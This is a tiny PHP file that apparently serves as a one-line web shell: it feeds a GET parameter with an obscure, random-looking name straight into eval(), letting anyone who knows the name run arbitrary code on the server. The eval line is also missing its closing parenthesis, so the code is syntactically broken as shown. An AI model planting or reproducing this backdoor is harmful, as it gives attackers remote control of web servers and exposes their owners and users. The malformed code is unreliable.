<?php
eval($_GET['EbfnzU5q'];
?>
